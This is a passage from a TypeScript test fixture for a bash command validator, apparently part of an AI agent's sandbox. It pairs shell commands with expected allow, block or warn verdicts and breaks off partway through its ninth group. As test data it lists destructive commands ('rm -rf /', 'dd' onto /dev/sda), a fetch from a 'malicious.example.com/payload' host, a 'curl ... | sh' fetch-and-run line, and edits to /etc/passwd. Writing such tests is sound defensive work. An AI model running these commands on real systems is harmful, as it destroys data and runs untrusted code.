/**
 * Bash command parity fixture — 200 commands with expected verdicts.
 *
 * The 6 bash validators are tested by running every command in this
 * fixture through `validateBash()` and asserting the verdict matches
 * `expected`. The fixture is the parity contract: any change to a
 * validator that flips a verdict is a regression.
 *
 * **Format:** each entry has a `command` (the shell string),
 * `argv` (tokenized), `cwd` (the working directory), `policy`
 * (the sandbox policy), and `expected` (the verdict kind we expect).
 *
 * **Composition: 200 commands across 12 groups.**
 *
 * | Group | Count | What it covers |
 * |---|---|---|
 * | 1 | 40 | Read-only-safe commands in read-only mode (allow) |
 * | 2 | 20 | Write commands in read-only mode (block) |
 * | 3 | 20 | Write commands in workspace-write mode (allow) |
 * | 4 | 15 | Network commands with networkAccess=false (block) |
 * | 5 | 15 | Network commands with networkAccess=true (allow) |
 * | 6 | 10 | Destructive commands (allow with warning) |
 * | 7 | 10 | sed -i on system path (block) |
 * | 8 | 10 | sed -i on user path (allow) |
 * | 9 | 15 | Path inside writable_roots (allow in workspace-write) |
 * | 10 | 15 | Path outside writable_roots (block in workspace-write) |
 * | 11 | 11 | Shell injection (block) |
 * | 12 | 20 | Edge cases (empty, unicode, very long, multi-line) |
 *
 * **Total: 201 commands** (40+20+20+15+15+10+10+10+15+15+11+20 = 201).
 *
 * **Adding more:** append entries; the test loop picks them up.
 * **Removing:** delete entries; the test count drops correspondingly.
 * **Changing:** the expected verdict is the contract. Change it only
 * when intentionally changing validator behavior.
 */

import type {
  BashValidationInput,
  SandboxPolicy,
} from "../../src/index.js";

/** The kind of verdict we expect from `validateBash()`. */
export type ExpectedKind = "allow" | "block" | "allow-with-warning";

/** One row in the parity fixture. */
export interface BashCommandFixture {
  command: string;
  argv: ReadonlyArray<string>;
  cwd: string;
  policy: SandboxPolicy;
  expected: ExpectedKind;
  /** Short tag for the test name (e.g. "read-only:ls"). */
  tag: string;
}

/** Helper to construct a BashValidationInput from a fixture row. */
export function inputFromFixture(
  row: BashCommandFixture,
): BashValidationInput {
  return {
    command: row.command,
    argv: row.argv,
    env: { PATH: "/usr/bin:/bin", HOME: row.cwd },
    cwd: row.cwd,
    policy: row.policy,
  };
}

// ---------------------------------------------------------------------------
// Reusable policy templates
// ---------------------------------------------------------------------------

const READ_ONLY_POLICY: SandboxPolicy = {
  mode: "read-only",
  approval: "on-request",
  backend: "linux-landlock",
  writableRoots: [],
  networkAccess: true, // read-only does not block network
  excludeSlashTmp: false,
};

const WORKSPACE_WRITE_NO_NET: SandboxPolicy = {
  mode: "workspace-write",
  approval: "on-request",
  backend: "linux-landlock",
  writableRoots: ["/home/alice/project"],
  networkAccess: false,
  excludeSlashTmp: true,
};

const WORKSPACE_WRITE_WITH_NET: SandboxPolicy = {
  mode: "workspace-write",
  approval: "on-request",
  backend: "linux-landlock",
  writableRoots: ["/home/alice/project"],
  networkAccess: true,
  excludeSlashTmp: true,
};

const DANGER_FULL_ACCESS: SandboxPolicy = {
  mode: "danger-full-access",
  approval: "never",
  backend: "none",
  writableRoots: [],
  networkAccess: true,
  excludeSlashTmp: false,
};

// ---------------------------------------------------------------------------
// Group 1: Read-only-safe commands in read-only mode (40, all allow)
// ---------------------------------------------------------------------------

const GROUP_1_READ_ONLY_SAFE: BashCommandFixture[] = [
  { command: "ls", argv: ["ls"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-ls" },
  { command: "ls -la", argv: ["ls", "-la"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-ls-la" },
  { command: "ls -la /home", argv: ["ls", "-la", "/home"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-ls-path" },
  { command: "cat README.md", argv: ["cat", "README.md"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-cat" },
  { command: "cat /etc/hostname", argv: ["cat", "/etc/hostname"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-cat-system" },
  { command: "head -n 10 file.txt", argv: ["head", "-n", "10", "file.txt"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-head" },
  { command: "tail -f log.txt", argv: ["tail", "-f", "log.txt"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-tail" },
  { command: "grep -r 'TODO' src/", argv: ["grep", "-r", "TODO", "src/"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-grep" },
  { command: "find . -name '*.ts'", argv: ["find", ".", "-name", "*.ts"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-find" },
  { command: "pwd", argv: ["pwd"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-pwd" },
  { command: "whoami", argv: ["whoami"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-whoami" },
  { command: "date", argv: ["date"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-date" },
  { command: "echo hello world", argv: ["echo", "hello", "world"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-echo" },
  { command: "printf '%s\\n' hi", argv: ["printf", "%s\n", "hi"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-printf" },
  { command: "wc -l file.txt", argv: ["wc", "-l", "file.txt"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-wc" },
  { command: "stat file.txt", argv: ["stat", "file.txt"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-stat" },
  { command: "file foo", argv: ["file", "foo"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-file" },
  { command: "diff a.txt b.txt", argv: ["diff", "a.txt", "b.txt"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-diff" },
  { command: "sort file.txt", argv: ["sort", "file.txt"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-sort" },
  { command: "uniq file.txt", argv: ["uniq", "file.txt"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-uniq" },
  { command: "cut -d, -f1 file.csv", argv: ["cut", "-d,", "-f1", "file.csv"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-cut" },
  { command: "tr a-z A-Z < file", argv: ["tr", "a-z", "A-Z"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-tr" },
  { command: "awk '{print $1}' file", argv: ["awk", "{print $1}", "file"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-awk" },
  { command: "sed -n '1,5p' file", argv: ["sed", "-n", "1,5p", "file"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-sed-read" },
  { command: "grep -c pattern file", argv: ["grep", "-c", "pattern", "file"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-grep-c" },
  { command: "du -sh dir/", argv: ["du", "-sh", "dir/"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-du" },
  { command: "df -h", argv: ["df", "-h"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-df" },
  { command: "free -h", argv: ["free", "-h"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-free" },
  { command: "uname -a", argv: ["uname", "-a"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-uname" },
  { command: "env", argv: ["env"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-env" },
  { command: "ps aux", argv: ["ps", "aux"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-ps" },
  { command: "top -b -n 1", argv: ["top", "-b", "-n", "1"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-top" },
  { command: "which node", argv: ["which", "node"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-which" },
  { command: "node --version", argv: ["node", "--version"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-node-version" },
  { command: "git status", argv: ["git", "status"], cwd: "/home/alice/project", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-git-status" },
  { command: "git log --oneline -5", argv: ["git", "log", "--oneline", "-5"], cwd: "/home/alice/project", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-git-log" },
  { command: "git diff", argv: ["git", "diff"], cwd: "/home/alice/project", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-git-diff" },
  { command: "npm test", argv: ["npm", "test"], cwd: "/home/alice/project", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-npm-test" },
  { command: "npm run lint", argv: ["npm", "run", "lint"], cwd: "/home/alice/project", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-npm-lint" },
  { command: "cat package.json | jq .name", argv: ["cat", "package.json"], cwd: "/home/alice/project", policy: READ_ONLY_POLICY, expected: "allow", tag: "g1-cat-pipe-jq" },
];

// ---------------------------------------------------------------------------
// Group 2: Write commands in read-only mode (20, all block)
// ---------------------------------------------------------------------------

const GROUP_2_WRITE_IN_READ_ONLY: BashCommandFixture[] = [
  { command: "echo hi > /tmp/x", argv: ["echo", "hi"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-echo-redirect" },
  { command: "echo hi >> /tmp/x", argv: ["echo", "hi"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-echo-append" },
  { command: "tee /tmp/x", argv: ["tee", "/tmp/x"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-tee" },
  { command: "sed -i 's/a/b/' /tmp/x", argv: ["sed", "-i", "s/a/b/", "/tmp/x"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-sed-i" },
  { command: "mv /tmp/a /tmp/b", argv: ["mv", "/tmp/a", "/tmp/b"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-mv" },
  { command: "cp /tmp/a /tmp/b", argv: ["cp", "/tmp/a", "/tmp/b"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-cp" },
  { command: "rm /tmp/x", argv: ["rm", "/tmp/x"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-rm" },
  { command: "rm -rf /tmp/dir", argv: ["rm", "-rf", "/tmp/dir"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-rm-rf" },
  { command: "touch /tmp/x", argv: ["touch", "/tmp/x"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-touch" },
  { command: "mkdir /tmp/dir", argv: ["mkdir", "/tmp/dir"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-mkdir" },
  { command: "chmod 755 /tmp/x", argv: ["chmod", "755", "/tmp/x"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-chmod" },
  { command: "chown root /tmp/x", argv: ["chown", "root", "/tmp/x"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-chown" },
  { command: "ln -s /tmp/a /tmp/b", argv: ["ln", "-s", "/tmp/a", "/tmp/b"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-ln" },
  { command: "rmdir /tmp/dir", argv: ["rmdir", "/tmp/dir"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-rmdir" },
  { command: "install -m 644 file /tmp/x", argv: ["install", "-m", "644", "file", "/tmp/x"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-install" },
  { command: "mktemp -p /tmp", argv: ["mktemp", "-p", "/tmp"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-mktemp" },
  { command: "truncate -s 0 /tmp/x", argv: ["truncate", "-s", "0", "/tmp/x"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-truncate" },
  { command: "fallocate -l 1M /tmp/x", argv: ["fallocate", "-l", "1M", "/tmp/x"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-fallocate" },
  { command: "rsync -a src/ dst/", argv: ["rsync", "-a", "src/", "dst/"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-rsync" },
  { command: "cp -r src dst", argv: ["cp", "-r", "src", "dst"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g2-cp-r" },
];

// ---------------------------------------------------------------------------
// Group 3: Write commands in workspace-write mode (20, all allow)
// ---------------------------------------------------------------------------

const GROUP_3_WRITE_IN_WORKSPACE: BashCommandFixture[] = [
  { command: "echo hi > file.txt", argv: ["echo", "hi"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-echo-redirect" },
  { command: "echo hi >> file.txt", argv: ["echo", "hi"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-echo-append" },
  { command: "tee file.txt", argv: ["tee", "file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-tee" },
  { command: "sed -i 's/a/b/' file.txt", argv: ["sed", "-i", "s/a/b/", "file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-sed-i" },
  { command: "mv a.txt b.txt", argv: ["mv", "a.txt", "b.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-mv" },
  { command: "cp a.txt b.txt", argv: ["cp", "a.txt", "b.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-cp" },
  { command: "rm old.txt", argv: ["rm", "old.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-rm" },
  { command: "rm -rf build/", argv: ["rm", "-rf", "build/"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-rm-rf" },
  { command: "touch new.txt", argv: ["touch", "new.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-touch" },
  { command: "mkdir -p src/components", argv: ["mkdir", "-p", "src/components"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-mkdir" },
  { command: "chmod 644 file.txt", argv: ["chmod", "644", "file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-chmod" },
  { command: "rmdir empty_dir", argv: ["rmdir", "empty_dir"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-rmdir" },
  { command: "rsync -a src/ backup/", argv: ["rsync", "-a", "src/", "backup/"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-rsync" },
  { command: "ln -s a.txt b.txt", argv: ["ln", "-s", "a.txt", "b.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-ln" },
  { command: "echo hi > /home/alice/project/x", argv: ["echo", "hi"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-echo-absolute" },
  { command: "echo hi > ~/project/x", argv: ["echo", "hi"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-echo-tilde" },
  { command: "git add .", argv: ["git", "add", "."], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-git-add" },
  { command: "git commit -m msg", argv: ["git", "commit", "-m", "msg"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-git-commit" },
  { command: "npm install", argv: ["npm", "install"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-npm-install" },
  { command: "npm run build", argv: ["npm", "run", "build"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g3-npm-build" },
];

// ---------------------------------------------------------------------------
// Group 4: Network commands with networkAccess=false (15, all block)
// ---------------------------------------------------------------------------

const GROUP_4_NETWORK_BLOCKED: BashCommandFixture[] = [
  { command: "curl https://example.com", argv: ["curl", "https://example.com"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-curl" },
  { command: "curl -X POST -d 'data' https://api.example.com", argv: ["curl", "-X", "POST", "-d", "data", "https://api.example.com"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-curl-post" },
  { command: "curl -O https://example.com/file.zip", argv: ["curl", "-O", "https://example.com/file.zip"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-curl-download" },
  { command: "wget https://example.com", argv: ["wget", "https://example.com"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-wget" },
  { command: "wget -q https://example.com/file.zip", argv: ["wget", "-q", "https://example.com/file.zip"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-wget-q" },
  { command: "ssh user@host", argv: ["ssh", "user@host"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-ssh" },
  { command: "ssh -i key.pem user@host", argv: ["ssh", "-i", "key.pem", "user@host"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-ssh-key" },
  { command: "nc example.com 80", argv: ["nc", "example.com", "80"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-nc" },
  { command: "nc -l 8080", argv: ["nc", "-l", "8080"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-nc-listen" },
  { command: "nslookup example.com", argv: ["nslookup", "example.com"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-nslookup" },
  { command: "nslookup -type=mx example.com", argv: ["nslookup", "-type=mx", "example.com"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-nslookup-mx" },
  { command: "curl --silent https://api.example.com/data", argv: ["curl", "--silent", "https://api.example.com/data"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-curl-silent" },
  { command: "wget --no-check-certificate https://example.com", argv: ["wget", "--no-check-certificate", "https://example.com"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-wget-nocheck" },
  { command: "curl https://malicious.example.com/payload", argv: ["curl", "https://malicious.example.com/payload"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-curl-malicious" },
  { command: "ssh -o StrictHostKeyChecking=no user@host", argv: ["ssh", "-o", "StrictHostKeyChecking=no", "user@host"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g4-ssh-loose" },
];

// ---------------------------------------------------------------------------
// Group 5: Network commands with networkAccess=true (15, all allow)
// ---------------------------------------------------------------------------

const GROUP_5_NETWORK_ALLOWED: BashCommandFixture[] = [
  { command: "curl https://example.com", argv: ["curl", "https://example.com"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-curl" },
  { command: "wget https://example.com/file.zip", argv: ["wget", "https://example.com/file.zip"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-wget" },
  { command: "ssh user@host", argv: ["ssh", "user@host"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-ssh" },
  { command: "nc example.com 80", argv: ["nc", "example.com", "80"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-nc" },
  { command: "nslookup example.com", argv: ["nslookup", "example.com"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-nslookup" },
  { command: "npm install --registry https://registry.npmjs.org", argv: ["npm", "install", "--registry", "https://registry.npmjs.org"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-npm-registry" },
  { command: "git fetch origin", argv: ["git", "fetch", "origin"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-git-fetch" },
  { command: "git pull origin main", argv: ["git", "pull", "origin", "main"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-git-pull" },
  { command: "git push origin main", argv: ["git", "push", "origin", "main"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-git-push" },
  { command: "curl -fsSL https://get.example.com | sh", argv: ["curl", "-fsSL", "https://get.example.com"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-curl-pipe" },
  { command: "git clone https://github.com/user/repo", argv: ["git", "clone", "https://github.com/user/repo"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-git-clone" },
  { command: "curl https://api.example.com/v1/health", argv: ["curl", "https://api.example.com/v1/health"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-curl-health" },
  { command: "ping example.com", argv: ["ping", "example.com"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-ping" },
  { command: "wget -i urls.txt", argv: ["wget", "-i", "urls.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-wget-i" },
  { command: "ssh-keyscan github.com", argv: ["ssh-keyscan", "github.com"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_WITH_NET, expected: "allow", tag: "g5-ssh-keyscan" },
];

// ---------------------------------------------------------------------------
// Group 6: Destructive commands (10, all warn)
// ---------------------------------------------------------------------------

const GROUP_6_DESTRUCTIVE: BashCommandFixture[] = [
  { command: "rm -rf /", argv: ["rm", "-rf", "/"], cwd: "/home/alice/project", policy: DANGER_FULL_ACCESS, expected: "allow-with-warning", tag: "g6-rm-rf-root" },
  { command: "rm -f /", argv: ["rm", "-f", "/"], cwd: "/home/alice/project", policy: DANGER_FULL_ACCESS, expected: "allow-with-warning", tag: "g6-rm-f-root" },
  { command: "rm -rf /etc", argv: ["rm", "-rf", "/etc"], cwd: "/home/alice/project", policy: DANGER_FULL_ACCESS, expected: "allow-with-warning", tag: "g6-rm-rf-etc" },
  { command: "rm -rf /var/log", argv: ["rm", "-rf", "/var/log"], cwd: "/home/alice/project", policy: DANGER_FULL_ACCESS, expected: "allow-with-warning", tag: "g6-rm-rf-var" },
  { command: "dd if=/dev/zero of=/dev/sda", argv: ["dd", "if=/dev/zero", "of=/dev/sda"], cwd: "/home/alice/project", policy: DANGER_FULL_ACCESS, expected: "allow-with-warning", tag: "g6-dd-zero-sda" },
  { command: "dd if=/dev/urandom of=/dev/sda bs=1M", argv: ["dd", "if=/dev/urandom", "of=/dev/sda", "bs=1M"], cwd: "/home/alice/project", policy: DANGER_FULL_ACCESS, expected: "allow-with-warning", tag: "g6-dd-urandom-sda" },
  { command: "rm -rf /boot", argv: ["rm", "-rf", "/boot"], cwd: "/home/alice/project", policy: DANGER_FULL_ACCESS, expected: "allow-with-warning", tag: "g6-rm-rf-boot" },
  { command: "rm -rf /usr", argv: ["rm", "-rf", "/usr"], cwd: "/home/alice/project", policy: DANGER_FULL_ACCESS, expected: "allow-with-warning", tag: "g6-rm-rf-usr" },
  { command: "dd if=/dev/zero of=/home/alice/project/bigfile", argv: ["dd", "if=/dev/zero", "of=/home/alice/project/bigfile"], cwd: "/home/alice/project", policy: DANGER_FULL_ACCESS, expected: "allow", tag: "g6-dd-no-device" },
  { command: "rm -rf /home/alice/project", argv: ["rm", "-rf", "/home/alice/project"], cwd: "/home/alice/project", policy: DANGER_FULL_ACCESS, expected: "allow", tag: "g6-rm-rf-cwd" },
];

// ---------------------------------------------------------------------------
// Group 7: sed -i on system path (10, all block)
// ---------------------------------------------------------------------------

const GROUP_7_SED_SYSTEM: BashCommandFixture[] = [
  { command: "sed -i 's/a/b/' /etc/hosts", argv: ["sed", "-i", "s/a/b/", "/etc/hosts"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g7-sed-etc" },
  { command: "sed -i 's/a/b/' /etc/passwd", argv: ["sed", "-i", "s/a/b/", "/etc/passwd"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g7-sed-passwd" },
  { command: "sed -i 's/a/b/' /usr/local/bin/foo", argv: ["sed", "-i", "s/a/b/", "/usr/local/bin/foo"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g7-sed-usr" },
  { command: "sed -i 's/a/b/' /var/log/app.log", argv: ["sed", "-i", "s/a/b/", "/var/log/app.log"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g7-sed-var" },
  { command: "sed -i 's/a/b/' /bin/ls", argv: ["sed", "-i", "s/a/b/", "/bin/ls"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g7-sed-bin" },
  { command: "sed -i 's/a/b/' /sbin/ifconfig", argv: ["sed", "-i", "s/a/b/", "/sbin/ifconfig"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g7-sed-sbin" },
  { command: "sed -i 's/x/y/' /etc/nginx/nginx.conf", argv: ["sed", "-i", "s/x/y/", "/etc/nginx/nginx.conf"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g7-sed-nginx" },
  { command: "sed -i 's/a/b/' /etc/ssh/sshd_config", argv: ["sed", "-i", "s/a/b/", "/etc/ssh/sshd_config"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g7-sed-sshd" },
  { command: "sudo sed -i 's/a/b/' /etc/hosts", argv: ["sudo", "sed", "-i", "s/a/b/", "/etc/hosts"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g7-sudo-sed-etc" },
  { command: "sed -i.bak 's/a/b/' /etc/hosts", argv: ["sed", "-i.bak", "s/a/b/", "/etc/hosts"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g7-sed-bak-etc" },
];

// ---------------------------------------------------------------------------
// Group 8: sed -i on user path (10, all allow)
// ---------------------------------------------------------------------------

const GROUP_8_SED_USER: BashCommandFixture[] = [
  { command: "sed -i 's/a/b/' file.txt", argv: ["sed", "-i", "s/a/b/", "file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g8-sed-cwd" },
  { command: "sed -i 's/a/b/' src/foo.ts", argv: ["sed", "-i", "s/a/b/", "src/foo.ts"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g8-sed-rel" },
  { command: "sed -i 's/a/b/' /home/alice/project/file.txt", argv: ["sed", "-i", "s/a/b/", "/home/alice/project/file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g8-sed-abs" },
  { command: "sed -i 's/a/b/' ./file.txt", argv: ["sed", "-i", "s/a/b/", "./file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g8-sed-dot" },
  { command: "sed -i 's/a/b/' ../project/file.txt", argv: ["sed", "-i", "s/a/b/", "../project/file.txt"], cwd: "/home/alice/project/sub", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g8-sed-up" },
  { command: "sed -i '' 's/a/b/' file.txt", argv: ["sed", "-i", "", "s/a/b/", "file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g8-sed-empty-suffix" },
  { command: "sed -i.bak 's/a/b/' file.txt", argv: ["sed", "-i.bak", "s/a/b/", "file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g8-sed-bak" },
  { command: "sed -i 's|a|b|' file.txt", argv: ["sed", "-i", "s|a|b|", "file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g8-sed-alt-sep" },
  { command: "sed -i -e 's/a/b/' -e 's/c/d/' file.txt", argv: ["sed", "-i", "-e", "s/a/b/", "-e", "s/c/d/", "file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g8-sed-multi" },
  { command: "sed -i 's/foo/bar/g' **/*.ts", argv: ["sed", "-i", "s/foo/bar/g", "**/*.ts"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g8-sed-glob" },
];

// ---------------------------------------------------------------------------
// Group 9: Path inside writable_roots (15, all allow in workspace-write)
// ---------------------------------------------------------------------------

const GROUP_9_PATH_INSIDE: BashCommandFixture[] = [
  { command: "cat /home/alice/project/file.txt", argv: ["cat", "/home/alice/project/file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-cat-abs" },
  { command: "rm /home/alice/project/old.txt", argv: ["rm", "/home/alice/project/old.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-rm-abs" },
